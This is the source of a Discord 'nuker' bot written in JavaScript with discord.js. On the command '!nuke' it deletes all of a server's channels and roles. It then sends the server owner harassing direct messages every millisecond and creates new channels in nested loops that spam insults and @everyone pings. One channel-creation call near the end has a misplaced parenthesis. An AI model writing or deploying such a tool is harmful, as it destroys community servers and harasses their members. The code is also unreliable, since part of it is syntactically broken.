const Discord = require('discord.js');
const bot = new Discord.Client();

require("dotenv").config();

bot.login(process.env.TOKEN);

bot.on('ready', () => {
  console.log("Nuker Logged In As " + bot.user.tag);
});
bot.on('message', (message) => {
  let replies = [ 
    (`DRINZ OWNS YOU`),
    (`DRINZ RUNS THIS`),
    (`GET NUKED`),
    (`NUKED NOOBS`),
    (`NOOBS LOL`),
    (`NUKED LOL`),
    (`NUKED`),
    (`SO DOGWATER`),
    (`LOSERS`),
    (`GET NUKED LOSERS`),
    (`LMAO NUKED`),
    (`YOU SUCK`)
  ]

  if(message.content === '!nuke') {
    if (message.author.bot || message.channel.type === 'dm') {
      message.reply("You can only use this Command in a Server!")
    } else {
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.roles.cache.forEach(role => role.delete());

      setInterval(function() {
        message.guild.owner.user.send("YOUR SERVER GOT NUKED BY DRINZ NUKED IDIOT!");
      }, 1);

      message.guild.channels.create('NUKED BY DRINZ', {
        type: 'text',
        permissionOverwrites: [{
          id: message.guild.id,
          allow: ['VIEW_CHANNEL'],
        }]
      }).then(async channel => {
        setInterval(function() {
          channel.send(`${replies[Math.floor(Math.random() *    replies.length)]}` + " : " + "@everyone");
          message.guild.channels.create('NUKED BY DRINZ', {
            type: 'text',
            permissionOverwrites: [{
              id: message.guild.id,
              allow: ['VIEW_CHANNEL'],
            }]
          }).then(async channel => {
            setInterval(function() {
              channel.send(`${replies[Math.floor(Math.random() * replies.length)]}` + " : " + "@everyone");
            }, 1)
          }).then(function() {
            setInterval(function() {
              message.guild.channels.create('GET NUKED'), {
                type: 'text',
                permissionOverwrites: [{
                  id: message.guild.id,
                  allow: ['VIEW_CHANNEL'],
                }]
              }).then(async channel => {
                setInterval(function() {
                  channel.send(`${replies[Math.floor(Math.random() * replies.length)]}` + " : " + "@everyone");
                }, 1)
              })
            }, 1)
          })
        }, 1)
      })
    }
  }
});
